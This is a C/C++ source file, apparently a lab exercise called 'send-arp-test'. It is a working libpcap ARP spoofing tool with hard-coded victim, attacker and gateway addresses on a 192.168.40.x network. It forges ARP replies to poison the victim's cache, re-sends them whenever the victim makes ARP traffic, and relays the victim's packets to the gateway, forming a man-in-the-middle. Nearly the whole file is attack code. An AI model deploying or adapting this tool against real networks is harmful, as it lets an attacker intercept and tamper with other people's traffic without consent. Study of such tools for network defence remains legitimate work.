#include <stdio.h>
#include <stdint.h>
#include "hdr.h"
#include <pcap.h>
#include <arpa/inet.h>
#include <string.h>

#pragma pack(push, 1)
typedef struct ARP_Packet{
    Ether eth;
    ARP arp;
}ARP_packet;
#pragma pack(pop)

uint8_t victim_mac[6] = {0x00,0x0c,0x29,0x80,0xba,0x23};
uint8_t attacker_mac[6] = {0x00,0x0c,0x29,0x47,0x41,0x30};
uint8_t gateway_mac[6] = {0x00,0x50,0x56,0xee,0xca,0x02};

void usage() {
    printf("syntax: send-arp-test <interface>\n");
    printf("sample: send-arp-test wlan0\n");
}

int main(int argc, char* argv[]){
    if (argc != 2) {
        usage();
        return -1;
    }

    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev,BUFSIZ,1,1000,errbuf);
    if(handle == nullptr){
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }

    ARP_Packet arp_spoof;

    arp_spoof.eth.des[0] = 0x00;
    arp_spoof.eth.des[1] = 0x0c;
    arp_spoof.eth.des[2] = 0x29;
    arp_spoof.eth.des[3] = 0x80;
    arp_spoof.eth.des[4] = 0xba;
    arp_spoof.eth.des[5] = 0x23;

    arp_spoof.eth.src[0] = 0x00;
    arp_spoof.eth.src[1] = 0x0c;
    arp_spoof.eth.src[2] = 0x29;
    arp_spoof.eth.src[3] = 0x47;
    arp_spoof.eth.src[4] = 0x41;
    arp_spoof.eth.src[5] = 0x30;
    arp_spoof.eth.pkt_type =htons(0x0806);

    arp_spoof.arp.hd_type = htons(0x0001);
    arp_spoof.arp.prc_type = htons(0x0800);
    arp_spoof.arp.hd_addr_len = 0x06;
    arp_spoof.arp.prc_addr_len = 0x04;
    arp_spoof.arp.opcode = htons(0x0002);

    arp_spoof.arp.src_mac[0] = 0x00;
    arp_spoof.arp.src_mac[1] = 0x0c;
    arp_spoof.arp.src_mac[2] = 0x29;
    arp_spoof.arp.src_mac[3] = 0x47;
    arp_spoof.arp.src_mac[4] = 0x41;
    arp_spoof.arp.src_mac[5] = 0x30;

    arp_spoof.arp.src_ip = htonl(192<<24 | 168<<16 | 40<<8 |2);

    arp_spoof.arp.tag_mac[0] = 0x00;
    arp_spoof.arp.tag_mac[1] = 0x0c;
    arp_spoof.arp.tag_mac[2] = 0x29;
    arp_spoof.arp.tag_mac[3] = 0x80;
    arp_spoof.arp.tag_mac[4] = 0xba;
    arp_spoof.arp.tag_mac[5] = 0x23;

    arp_spoof.arp.tag_ip = htonl(192<<24 | 168<<16 | 40<<8 | 132);

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&arp_spoof), sizeof(ARP_Packet));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }


    while(true){
        struct pcap_pkthdr* header;
        const u_char* data;
        int res = pcap_next_ex(handle, &header, &data);
        if(res == 0) continue;
        if(res == -1 || res == -2){
            printf("pcap_next_ex return %d(%s)\n",res, pcap_geterr(handle));
        }

        Ether* eth = (Ether *)data;
        if(eth->pkt_type == htons(0x0806)){
            if(!(memcmp(eth->src,victim_mac,sizeof(uint8_t)*6))){
                int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&arp_spoof), sizeof(ARP_Packet));
                if (res != 0) {
                    fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
                }
                printf("Send ARP reply Packet\n");
                continue;
            }
        }

        if(!(memcmp(eth->src,victim_mac,sizeof(uint8_t)*6))){
            memcpy(eth->src,attacker_mac,sizeof(uint8_t)*6);
            memcpy(eth->des,gateway_mac,sizeof(uint8_t)*6);
            int res2 = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(data), header->caplen);
            if (res2 != 0) {
                fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
            }
        }
    }

    pcap_close(handle);
}
